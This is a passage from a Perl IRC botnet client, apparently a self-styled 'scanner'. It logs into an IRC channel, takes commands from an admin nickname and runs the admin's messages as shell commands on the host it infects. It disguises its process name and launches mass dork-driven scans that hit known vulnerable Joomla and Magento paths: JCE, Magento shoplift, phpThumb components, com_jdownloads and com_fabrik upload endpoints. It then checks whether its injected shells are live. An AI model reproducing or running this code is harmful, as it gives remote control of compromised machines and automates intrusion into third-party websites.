    if (defined($IRC_socket)) {
        $IRC_cur_socket = $IRC_socket;
        $IRC_socket->autoflush(1);
        $sel_client->add($IRC_socket);
        $irc_servers{$IRC_cur_socket}{'host'} = "$ircserver_con";
        $irc_servers{$IRC_cur_socket}{'port'} = "$ircport_con";
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;
        nick("$mynick");
        sendraw("USER $ident ".$IRC_socket->sockhost." $ircserver_con :$fullname");
        sleep 1;
    }
}

sub parse {
    my $servarg = shift;
    if ($servarg =~ /^PING \:(.*)/) {
        sendraw("PONG :$1");
    }
    elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
        if (lc($1) eq lc($mynick)) {
            $mynick = $4;
            $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        }
    }
    elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
        nick("$mynick".int rand(999));
    }
    elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
        $mynick = $2;
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
        sendraw("MODE $mynick +Bx");
	sendraw("NS id alin000");
	sleep(3);
        sendraw("JOIN $channel");
        sendraw("JOIN $base o");
	sleep(1);
        #sendraw("PRIVMSG $channel :4SexCrime Database Rev Wordpress Priv8 Scanner SE v5.1");
        sendraw("PRIVMSG $admin :Hi $admin im here ready to Serve !!!");
    }
}

my $line_temp;
while( 1 ) {
    while (!(keys(%irc_servers))) { connector("$nickname", "$ircserver", "$ircport"); }
    select(undef, undef, undef, 0.01);
    delete($irc_servers{''}) if (defined($irc_servers{''}));
    my @ready = $sel_client->can_read(0);
    next unless(@ready);
    foreach $fh (@ready) {
        $IRC_cur_socket = $fh;
        $mynick = $irc_servers{$IRC_cur_socket}{'nick'};
        $nread = sysread($fh, $ircmsg, 4096);
        if ($nread == 0) {
            $sel_client->remove($fh);
            $fh->close;
            delete($irc_servers{$fh});
        }
        @lines = split (/\n/, $ircmsg);
        $ircmsg =~ s/\r\n$//;

        if ($ircmsg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
            my ($nick,$ident,$host,$path,$msg) = ($1,$2,$3,$4,$5);
	my $engine ="aanK,coi,Prince,kangkung,roin,Keren,Beken,Marlboro,successor,Brewok,UAE,Myanmar,Argentina,Austria,Australia,Brazil,Canada,Chili,CoMersil,Czech,Germany,Denmark,Spain,Europe,France,Hungary,Indonesia,Israel,India,Info,Iran,Italy,Japan,Korea,Mexico,Malaysia,Network,Netherlands,Organization,Philippines,Polan,Romania,Russian,Thailand,Ukraine,England,USA,Slovenia,Belgium,Bussines,SouthAfrica,Vietnam,Tuvalu,Cocos,Turky,Asia,Serbia,Singapore,Taiwan,Sweden,Pakistan,Norway,Montenegro,Greece,Education,Goverment,Kazakhstan,Afganistan,Albania,Algeria,Angola,Armenia,Azerbaijan,Bahrain,Bangladesh,Belarus,Bhutan,Bolivia,Bosnia,Bulgaria,Brunei,Cambodia,Cameroon,Christmas,CostaRika,Croatia,Cuba,Cyprus,Dominican,Equador,Egypt,Estonia,Finland,Georgia,Ghana,Grenada,Honduras,Hongkong,Iceland,Ireland,Kenya,Kuwait,Laos,Latvia,Liberia,Libyan,Lithuania,Macedonia,Malta,Mongolia,Mozambique,Namibia,Nauru,Nepal,NewZealand,Nigeria,Paraguay,Peru,Portugal,PuertoRico,Qatar,SaintLucia,Samoa,SaudiArabia,Senegal,Slovakia,Srilanka,Swaziland,Tajikistan,Tanzania,Tokelau,Tonga,Tunisia,Uruguay,Uzbekistan,Venezuela,Yemen,Yugoslavia,Zambia,Uganda,Trinidad,Zimbabwe,KonToL,PePek,TeTek,ItiL,Vagina,NenNen,SuSu,BuahDada,PayuDara,Kentot,eMeL,OraL,Klitoris,Masturbasi,Onani,Sperma,AnaL,Puting,Penis,MeMek,GooGLeCA,GooGLeDE,GooGLeUK,GooGLeFR,GooGLeES,GooGLeIT,GooGLeNL,GooGLeBE,GooGLeCH,GooGLeSE,GooGLeDK,GooGLeNO,GooGLeNZ,GooGLeIE,GooGLeBR,GooGLeAR,GooGLeCO,GooGLeCU,GooGLeCL,GooGLeMX,GooGLeAU,GooGLeRU,GooGLeAT,GooGLePL,GooGLeIL,GooGLeTR,GooGLeUA,GooGLeGR,GooGLeJP,GooGLeCN,GooGLeMY,GooGLeTH,GooGLeIN,GooGLeKR,GooGLeRO,GooGLeTW,GooGLeZA,GooGLePT,BingDE,BingUK,BingCA,BingBR,BingFR,BingES,BingIT,BingBE,BingNL,BingPT,BingNO,BingDK,BingSE,BingCH,BingNZ,BingRU,BingJP,BingCN,BingKR,BingMX,BingAR,BingCL,BingAU,AsKCA,AsKDE,AsKIT,AsKFR,AsKES,AsKRU,AsKNL,AsKUK,AsKBR,AsKPL,AsKAU,AsKAT,AsKJP,AsKSE,AsKMX,AsKNO,AsKDK";
            if ($path eq $mynick) {
                if ($msg =~ /^PING (.*)/) {
                    sendraw("NOTICE $nick :PING $1");
                }
                #if ($msg =~ /^VERSION/) {
                 #   sendraw("NOTICE $nick :VERSION mIRC v6.21 Khaled Mardam-Bey");
                #}
                if ($msg =~ /^TIME/) {
                    sendraw("NOTICE $nick :TIME ".$datetime."");
                }
                if (&isAdmin($nick) && $msg eq "!die") {
                    &shell("$path","kill -9 $$");
                }
                if (&isAdmin($nick) && $msg eq "!killall") {
                    &shell("$path","killall -9 perl");
                }
                if (&isAdmin($nick) && $msg eq "!reset") {
                    sendraw("QUIT :Restarting...");
                }
                if (&isAdmin($nick) && $msg =~ /^!join \#(.+)/) {
                    sendraw("JOIN #".$1);
                }
                if (&isAdmin($nick) && $msg =~ /^!part \#(.+)/) {
                    sendraw("PART #".$1);
                }
                if (&isAdmin($nick) && $msg =~ /^!nick (.+)/) {
                    sendraw("NICK ".$1);
                }
                if (&isAdmin($nick) && $msg =~ /^!pid/) {
                    sendraw($IRC_cur_socket, "PRIVMSG $nick :Fake Process/PID : $fakeproc - $$");
                }
                if (&isAdmin($nick) && $msg !~ /^!/) {
                    &shell("$nick","$msg");
                }
            }
            else {
                if (&isAdmin($nick) && $msg eq "!die") {
                    &shell("$path","kill -9 $$");
                }
                if (&isAdmin($nick) && $msg eq "!killall") {
                    &shell("$path","killall -9 perl");
                }
                if (&isAdmin($nick) && $msg eq "!reset") {
                    sendraw("QUIT :Restarting...");
                }
                if (&isAdmin($nick) && $msg =~ /^!join \#(.+)/) {
                    sendraw("JOIN #".$1);
                }
                if (&isAdmin($nick) && $msg eq "!part") {
                    sendraw("PART $path");
                }
                if (&isAdmin($nick) && $msg =~ /^!part \#(.+)/) {
                    sendraw("PART #".$1);
                }
                if (&isAdmin($nick) && $msg =~ /^\.sh (.*)/) {
                    &shell("$path","$1");
                }
                if (&isAdmin($nick) && $msg =~ /^$mynick (.*)/) {
                    &shell("$path","$1");
                }
		if (&isAdmin($nick) && $msg =~ /^!addadmin\ (.+) /) {
					if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
					$newadmin = $1;
					$admin = $newadmin;
					&msg("$path","12 Admin added to4 $admin ");
				}}}
                ##################################################################### HELP COMMAND

                if (&isAdmin($nick) && $msg =~ /^!help/) {
                    my $helplogo = "15(7@2Help15)";
			my $privscan1 = "";
					if ($privscan == 1){
						$privscan1 = "4OFF!!!";
					}else{
						$privscan1 = "9ON!!!";
					}
					&msg("$path","$helplogo 12Private : $privscan1");
					&msg("$path","$helplogo 12Jce Scan:6 $jcecmd [dork]");
					&msg("$path","$helplogo 12Magento Scan:6 $shopliftcmd [dork]");
					&msg("$path","$helplogo 12Act Scan:6 $actcmd [dork]");
					&msg("$path","$helplogo 12JDownload Scan:6 $jdlcmd [dork]");
					&msg("$path","$helplogo 12Flexi-Content Scan:6 $flecmd [dork]");
					&msg("$path","$helplogo 12jmultimedia Scan:6 $jmucmd [dork]");
					&msg("$path","$helplogo 12hornot2 Scan:6 $horcmd [dork]");
					&msg("$path","$helplogo 12alphauserpoints Scan:6 $alpcmd [dork]");
					&msg("$path","$helplogo 12Fabrik Scan:6 $fabcmd [dork]");
		   
		   
                }
                if ($msg=~ /^!response/ || $msg=~ /^!id/) {
                    	$inject = "";
			my $cekby = &get_content($jceid);
			if ($cekby =~ /GIF89/i){ $inject = "11Ready!!!"; } else { $inject = "15Lost!!!"; }
			&msg("$path","12Injector : $inject ");
		}
                
                if (&isAdmin($nick) && $msg =~ /^!pid/) {
                    &notice("$nick","6Fake Process/PID : $fakeproc - $$");
                }
				  if ($msg=~/^!check/){

                if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {

                    &msg("$channel","9 Checking 30 Bypass..!! Please Wait!");

                                        my $bystats1 = "";my $bystats2 = "";my $bystats3 = "";my $bystats4 = "";my $bystats5 = "";my $bystats6 = "";my $bystats7 = "";my $bystats8 = "";my $bystats9 = "";my $bystats10 = "";

                                        my $bystats11 = "";my $bystats12 = "";my $bystats13 = "";my $bystats14 = "";my $bystats15 = "";my $bystats16 = "";my $bystats17 = "";my $bystats18 = "";my $bystats19 = "";my $bystats20 = "";

										my $bystats21 = "";my $bystats22 = "";my $bystats23 = "";my $bystats24 = "";my $bystats25 = "";my $bystats26 = "";my $bystats27 = "";my $bystats28 = "";my $bystats29 = "";my $bystats30 = "";

                                        my $cekby1 = &get_content($jack1."aankfm");

                                        if ($cekby1 =~ /aankfm/i){ $bystats1 = "6Up!!!"; } else { $bystats1 = "4lost!!!"; }

                                        my $cekby2 = &get_content($jack2."aankfm");

                                        if ($cekby2 =~ /aankfm/i){ $bystats2 = "6Up!!!"; } else { $bystats2 = "4lost!!!"; }

                                        my $cekby3 = &get_content($jack3."aankfm");

                                        if ($cekby3 =~ /aankfm/i){ $bystats3 = "6Up!!!"; } else { $bystats3 = "4lost!!!"; }

                                        my $cekby4 = &get_content($jack4."aankfm");

                                        if ($cekby4 =~ /aankfm/i){ $bystats4 = "6Up!!!"; } else { $bystats4 = "4lost!!!"; }

                                        my $cekby5 = &get_content($jack5."aankfm");

                                        if ($cekby5 =~ /aankfm/i){ $bystats5 = "6Up!!!"; } else { $bystats5 = "4lost!!!"; }

                                        my $cekby6 = &get_content($jack6."aankfm");

                                        if ($cekby6 =~ /aankfm/i){ $bystats6 = "6Up!!!"; } else { $bystats6 = "4lost!!!"; }

                                        my $cekby7 = &get_content($jack7."aankfm");

                                        if ($cekby7 =~ /aankfm/i){ $bystats7 = "6Up!!!"; } else { $bystats7 = "4lost!!!"; }

                                        my $cekby8 = &get_content($jack8."aankfm");

                                        if ($cekby8 =~ /aankfm/i){ $bystats8 = "6Up!!!"; } else { $bystats8 = "4lost!!!"; }

                                        my $cekby9 = &get_content($jack9."aankfm");

                                        if ($cekby9 =~ /aankfm/i){ $bystats9 = "6Up!!!"; } else { $bystats9 = "4lost!!!"; }

                                        my $cekby10 = &get_content($jack10."aankfm");

                                        if ($cekby10 =~ /aankfm/i){ $bystats10 = "6Up!!!"; } else { $bystats10 = "4lost!!!"; }

                                        my $cekby11 = &get_content($jack11."aankfm");

                                        if ($cekby11 =~ /aankfm/i){ $bystats11 = "6Up!!!"; } else { $bystats11 = "4lost!!!"; }

                                        my $cekby12 = &get_content($jack12."aankfm");

                                        if ($cekby12 =~ /aankfm/i){ $bystats12 = "6Up!!!"; } else { $bystats12 = "4lost!!!"; }

                                        my $cekby13 = &get_content($jack13."aankfm");

                                        if ($cekby13 =~ /aankfm/i){ $bystats13 = "6Up!!!"; } else { $bystats13 = "4lost!!!"; }

                                        my $cekby14 = &get_content($jack14."aankfm");

                                        if ($cekby14 =~ /aankfm/i){ $bystats14 = "6Up!!!"; } else { $bystats14 = "4lost!!!"; }

                                        my $cekby15 = &get_content($jack15."aankfm");

                                        if ($cekby15 =~ /aankfm/i){ $bystats15 = "6Up!!!"; } else { $bystats15 = "4lost!!!"; }

                                        my $cekby16 = &get_content($jack16."aankfm");

                                        if ($cekby16 =~ /aankfm/i){ $bystats16 = "6Up!!!"; } else { $bystats16 = "4lost!!!"; }

                                        my $cekby17 = &get_content($jack17."aankfm");

                                        if ($cekby17 =~ /aankfm/i){ $bystats17 = "6Up!!!"; } else { $bystats17 = "4lost!!!"; }

                                        my $cekby18 = &get_content($jack18."aankfm");

                                        if ($cekby18 =~ /aankfm/i){ $bystats18 = "6Up!!!"; } else { $bystats18 = "4lost!!!"; }

                                        my $cekby19 = &get_content($jack19."aankfm");

                                        if ($cekby19 =~ /aankfm/i){ $bystats19 = "6Up!!!"; } else { $bystats19 = "4lost!!!"; }

                                        my $cekby20 = &get_content($jack20."aankfm");

                                        if ($cekby20 =~ /aankfm/i){ $bystats20 = "6Up!!!"; } else { $bystats20 = "4lost!!!"; }     

										my $cekby21 = &get_content($jack21."aankfm");

										if ($cekby21 =~ /aankfm/i){ $bystats21 = "6Up!!!"; } else { $bystats21 = "4lost!!!"; } 

										my $cekby22 = &get_content($jack22."aankfm");

										if ($cekby22 =~ /aankfm/i){ $bystats22 = "6Up!!!"; } else { $bystats22 = "4lost!!!"; } 

										my $cekby23= &get_content( $jack23."aankfm");

										if ($cekby23 =~ /aankfm/i){ $bystats23 = "6Up!!!"; } else { $bystats23 = "4lost!!!"; } 

										my $cekby24 = &get_content($jack24."aankfm");

										if ($cekby24 =~ /aankfm/i){ $bystats24 = "6Up!!!"; } else { $bystats24 = "4lost!!!"; } 

										my $cekby25 = &get_content($jack25."aankfm");

										if ($cekby25 =~ /aankfm/i){ $bystats25 = "6Up!!!"; } else { $bystats25 = "4lost!!!"; } 

										my $cekby26 = &get_content($jack26."aankfm");

										if ($cekby26 =~ /aankfm/i){ $bystats26 = "6Up!!!"; } else { $bystats26 = "4lost!!!"; } 

										my $cekby27 = &get_content($jack27."aankfm");

										if ($cekby27 =~ /aankfm/i){ $bystats27 = "6Up!!!"; } else { $bystats27 = "4lost!!!"; } 

										my $cekby28 = &get_content($jack28."aankfm");

										if ($cekby28 =~ /aankfm/i){ $bystats28 = "6Up!!!"; } else { $bystats28 = "4lost!!!"; } 

										my $cekby29 = &get_content($jack29."aankfm");

										if ($cekby29 =~ /aankfm/i){ $bystats29 = "6Up!!!"; } else { $bystats29 = "4lost!!!"; } 

										my $cekby30 = &get_content($jack30."aankfm");

										if ($cekby30 =~ /aankfm/i){ $bystats30 = "6Up!!!"; } else { $bystats30 = "4lost!!!"; }

                                        &msg("$channel","12 Mesin1= $bystats1 12 Mesin2= $bystats2 12 Mesin3= $bystats3 12 Mesin4= $bystats4 12Mesin5= $bystats5 12 Mesin6= $bystats6 12 Mesin7= $bystats7 12 Mesin8= $bystats8 12 Mesin9= $bystats9 12 Mesin10= $bystats10");sleep(2);

										&msg("$channel","12 Mesin11= $bystats11 12 Mesin12= $bystats12 12 Mesin13= $bystats13 12 Mesin14= $bystats14 12 Mesin15= $bystats15 12 Mesin16= $bystats16 12 Mesin17= $bystats17 12 Mesin18= $bystats18 12 Mesin19= $bystats19 12 Mesin20= $bystats20");sleep(2);

										&msg("$channel","12 Mesin21= $bystats21 12 Mesin22= $bystats22 12 Mesin23= $bystats23 12 Mesin24= $bystats24 12 Mesin25= $bystats25 12 Mesin26= $bystats26 12 Mesin27= $bystats27 12 Mesin28= $bystats28 12 Mesin29= $bystats29 12 Mesin30= $bystats30");sleep(2);

                                }}}
                ##################################################################### Command SCAN
		my $private = &checkPrivacy($nick);
    
    if(!$private) {
                	
	if (&isAdmin($nick) && $msg =~ /^$shopliftcmd\s+(.*)/) {
                if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
		my $dork = $1;
		 my $check = &read_dorks($dork);
		if ($check == 1) {
		&msg("$path","$searchlogo 4Ga bisa $nick bangsattt...itu2 aja dorkmu boss.. "); exit;
		} else {
		&msg("$path","$searchlogo 3Si $nick lagi scan Magento di $path ");
		&msg("$path","$searchlogo 12Dork :4 $dork");
		&msg("$path","$searchlogo 12Please wait for 1 hour from now..");
                #sendraw("MODE $path +m");
		&write_dorks($dork);
		&se_start($path,$bug,$dork,$engine,1,$nick);
		}
		
		}
		exit;
		}
		}

		
		if (&isAdmin($nick) && $msg =~ /^$jcecmd\s+(.*)/) {
                if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
		my $dork = $1;
		 my $check = &read_dorks($dork);
		if ($check == 1) {
		&msg("$path","$searchlogo 4Ga bisa $nick bangsattt...itu2 aja dorkmu boss.. "); exit;
		} else {
		&msg("$path","$searchlogo 3Si $nick lagi scan Jce di $path ");
		&msg("$path","$searchlogo 12Dork :4 $dork");
		&msg("$path","$searchlogo 12Please wait for 1 hour from now..");
                #sendraw("MODE $path +m");
		&write_dorks($dork);
		&se_start($path,$bug,$dork,$engine,2,$nick);
		}
		
		}
		exit;
		}
		}

		}
		if (&isAdmin($nick) && $msg =~ /^$actcmd\s+(.*)/) {
				if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
				my ($bug,$dork) = ("/components/com_alphacontent/assets/phpThumb/phpThumb.php?src=file.jpg",$1);
				my $check = &read_dorks($dork);
				if ($check == 1) {
				&msg("$path","$actlogo3 $nick, 4Dont try re-scan dork "); exit;
			} else {
				&msg("$path","$actlogo 12Dork7 :4 $dork ");
				&msg("$path","$actlogo 6Search Engine Loading ...");
				&se_start($path,$bug,$dork,$engine,3,$nick);
				&write_dorks($dork);
			}
		}
	}
}
		if (&isAdmin($nick) && $msg =~ /^$jdlcmd\s+(.*)/) {
				if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
				my ($bug,$dork) = ("/index.php?option=com_jdownloads&Itemid=0&view=upload",$1);
				my $check = &read_dorks($dork);
				if ($check == 1) {
				&msg("$path","$jdllogo3 $nick, 4Dont try re-scan dork "); exit;
			} else {
				&msg("$path","$jdllogo 12Dork7 :4 $dork ");
				&msg("$path","$jdllogo 6Search Engine Loading ...");
				&se_start($path,$bug,$dork,$engine,4,$nick);
				&write_dorks($dork);
			}
		}
	}
}

		if (&isAdmin($nick) && $msg =~ /^$foxcmd\s+(.*)/) {
				if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
		                my $dork = $1;
		                my $check = &read_dorks($dork);
		                if ($check == 1) {
				&msg("$path","$foxlogo3 $nick, 4Dont try re-scan dork "); exit;
			} else {
				&msg("$path","$foxlogo 12Dork7 :4 $dork ");
				&msg("$path","$foxlogo 6Search Engine Loading ...");
				&se_start($path,$bug,$dork,$engine,5,$nick);
				&write_dorks($dork);
			}
		}
	}
}

		if (&isAdmin($nick) && $msg =~ /^$flecmd\s+(.*)/) {
				if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
				my ($bug,$dork) = ("/components/com_flexicontent/librairies/phpthumb/phpThumb.php?src=file.jpg",$1);
				my $check = &read_dorks($dork);
				if ($check == 1) {
				&msg("$path","$flelogo3 $nick, 4Dont try re-scan dork "); exit;
			} else {
				&msg("$path","$flelogo 12Dork7 :4 $dork ");
				&msg("$path","$flelogo 6Search Engine Loading ...");
				&se_start($path,$bug,$dork,$engine,6,$nick);
				&write_dorks($dork);
			}
		}
	}
}

		if (&isAdmin($nick) && $msg =~ /^$alpcmd\s+(.*)/) {
				if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
				my ($bug,$dork) = ("/components/com_alphauserpoints/assets/phpThumb/phpThumb.php?src=file.jpg",$1);
				my $check = &read_dorks($dork);
				if ($check == 1) {
				&msg("$path","$alplogo3 $nick, 4Dont try re-scan dork "); exit;
			} else {
				&msg("$path","$alplogo 12Dork7 :4 $dork ");
				&msg("$path","$alplogo 6Search Engine Loading ...");
				&se_start($path,$bug,$dork,$engine,7,$nick);
				&write_dorks($dork);
			}
		}
	}
}

		if (&isAdmin($nick) && $msg =~ /^$horcmd\s+(.*)/) {
				if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
				my ($bug,$dork) = ("/components/com_hotornot2/phpThumb/phpThumb.php?src=file.jpg",$1);
				my $check = &read_dorks($dork);
				if ($check == 1) {
				&msg("$path","$horlogo3 $nick, 4Dont try re-scan dork "); exit;
			} else {
				&msg("$path","$horlogo 12Dork7 :4 $dork ");
				&msg("$path","$horlogo 6Search Engine Loading ...");
				&se_start($path,$bug,$dork,$engine,8,$nick);
				&write_dorks($dork);
			}
		}
	}
}

		if (&isAdmin($nick) && $msg =~ /^$jmucmd\s+(.*)/) {
				if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
				my ($bug,$dork) = ("/components/com_jmultimedia/assets/thumbs/phpthumb/phpThumb.php?src=file.jpg",$1);
				my $check = &read_dorks($dork);
				if ($check == 1) {
				&msg("$path","$jmulogo3 $nick, 4Dont try re-scan dork "); exit;
			} else {
				&msg("$path","$jmulogo 12Dork7 :4 $dork ");
				&msg("$path","$jmulogo 6Search Engine Loading ...");
				&se_start($path,$bug,$dork,$engine,9,$nick);
				&write_dorks($dork);
			}
		}
	}
}

		if (&isAdmin($nick) && $msg =~ /^$fabcmd\s+(.*)/) {
				if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
				my ($bug,$dork) = ("/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload",$1);
				my $check = &read_dorks($dork);
				if ($check == 1) {
				&msg("$path","$logo3 $nick, 4Dont try re-scan dork "); exit;
			} else {
				&msg("$path","$logo 12Dork7 :4 $dork ");
				&msg("$path","$logo 6Search Engine Loading ...");
				&se_start($path,$bug,$dork,$engine,11,$nick);
				&write_dorks($dork);
			}
		}
	}
}

		if (&isAdmin($nick) && $msg =~ /^$phpcmd\s+(.*)/) {
				if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
				my ($bug,$dork) = ("phpThumb.php",$1);
				my $check = &read_dorks($dork);
				if ($check == 1) {
				&msg("$path","3 $nick, 4Dont try re-scan dork "); exit;
			} else {
				&msg("$path","12Dork7 :4 $dork ");
				&msg("$path","6Search Engine Loading ...");
				&se_start($path,$bug,$dork,$engine,12,$nick);
				&write_dorks($dork);
			}
		}
	}
}

                if (&isAdmin($nick) && $msg =~ /^$oscocmd\s+(.*)/) {
			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
				my $dork = $1;
				if (-e ($osco_shell)) {
				&msg("$path","$oscologo 12Dork7 :4 $dork ");
				&msg("$path","$oscologo 6Search Engine Loading ...");
				&se_start($path,"bogel",$dork,$engine,10,$nick);
			} else {
				&msg("$path","15(7@2Injector15)4 Local PHP Shell not Found!"); exit;
			}
		}
	}
}
                #####################################################################

            }
        }

        for(my $c=0; $c<= $#lines; $c++) {
            $line = $lines[$c];
            $line = $line_temp.$line if ($line_temp);
            $line_temp = '';
            $line =~ s/\r$//;
            unless ($c == $#lines) {
                parse("$line");
            } else {
                if ($#lines == 0) {
                    parse("$line");
                } elsif ($lines[$c] =~ /\r$/) {
                    parse("$line");
                } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
                    parse("$line");
                } else {
                    $line_temp = $line;
                }
            }
        }
    }
}

##########################################################################################	Search engine
sub type() {
my ($chan,$bug,$dork,$engine,$type,$nick) = @_;
	   	if ($type == 1){$type=&shoplift($chan,$bug,$dork,$engine,$nick);}
 	elsif ($type == 2){$type=&jce_exploit($chan,$bug,$dork,$engine,$nick);}
 	elsif ($type == 3){$type=&act_exploit($chan,$bug,$dork,$engine,$nick);}
	elsif ($type == 4){$type=&jdl_exploit($chan,$bug,$dork,$engine,$nick);}
	elsif ($type == 5){$type=&fox_exploit($chan,$bug,$dork,$engine,$nick);}
	elsif ($type == 6){$type=&flexi_exploit($chan,$bug,$dork,$engine,$nick);}
	elsif ($type == 7){$type=&alpha_exploit($chan,$bug,$dork,$engine,$nick);}
	elsif ($type == 8){$type=&hornot_exploit($chan,$bug,$dork,$engine,$nick);}
	elsif ($type == 9){$type=&jmulti_exploit($chan,$bug,$dork,$engine,$nick);}
	elsif ($type == 10){$type=&osco_exploit($chan,$bug,$dork,$engine,$nick);}
	elsif ($type == 11){$type=&fab_exploit($chan,$bug,$dork,$engine,$nick);}
	elsif ($type == 12){$type=&php_xpl($chan,$bug,$dork,$engine,$nick);}
}	
sub se_start() {
my ($chan,$bug,$dork,$engine,$type,$nick) = @_;

	if ($engine =~ /aanK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$nick,$dork,"aanK",$type); } exit; } }

		if ($engine =~ /coi/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$nick,$dork,"coi",$type); } exit; } }

		if ($engine =~ /roin/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$nick,$dork,"roin",$type); } exit; } }

		if ($engine =~ /Keren/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$nick,$dork,"Keren",$type); } exit; } }

		if ($engine =~ /Beken/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$nick,$dork,"Beken",$type); } exit; } }

		if ($engine =~ /kangkung/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$nick,$dork,"kangkung",$type); } exit; } }

		if ($engine =~ /successor/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$nick,$dork,"successor",$type); } exit; } }

		if ($engine =~ /Brewok/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$nick,$dork,"Brewok",$type); } exit; } }

		if ($engine =~ /Marlboro/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$nick,$dork,"Marlboro",$type); } exit; } }

		if ($engine =~ /Prince/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$nick,$dork,"Prince",$type); } exit; } }	

        if ($engine =~ /uae/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"UAE",$type,$nick); } exit; } }

        if ($engine =~ /myanmar/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Myanmar",$type,$nick); } exit; } }

        if ($engine =~ /argentina/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Argentina",$type,$nick); } exit; } }

        if ($engine =~ /austria/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Austria",$type,$nick); } exit; } }

        if ($engine =~ /australia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Australia",$type,$nick); } exit; } }

        if ($engine =~ /brazil/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Brazil",$type,$nick); } exit; } }

        if ($engine =~ /canada/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Canada",$type,$nick); } exit; } }

        if ($engine =~ /chili/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Chili",$type,$nick); } exit; } }

        if ($engine =~ /cina/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Cina",$type,$nick); } exit; } }

        if ($engine =~ /comersil/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"CoMersil",$type,$nick); } exit; } }

        if ($engine =~ /czech/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Czech",$type,$nick); } exit; } }

        if ($engine =~ /germany/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Germany",$type,$nick); } exit; } }

        if ($engine =~ /denmark/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Denmark",$type,$nick); } exit; } }

        if ($engine =~ /spain/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Spain",$type,$nick); } exit; } }

        if ($engine =~ /europe/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Europe",$type,$nick); } exit; } }

        if ($engine =~ /france/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"France",$type,$nick); } exit; } }

        if ($engine =~ /hungary/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Hungary",$type,$nick); } exit; } }

        if ($engine =~ /indonesia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Indonesia",$type,$nick); } exit; } }

        if ($engine =~ /israel/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Israel",$type,$nick); } exit; } }

        if ($engine =~ /india/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"India",$type,$nick); } exit; } }

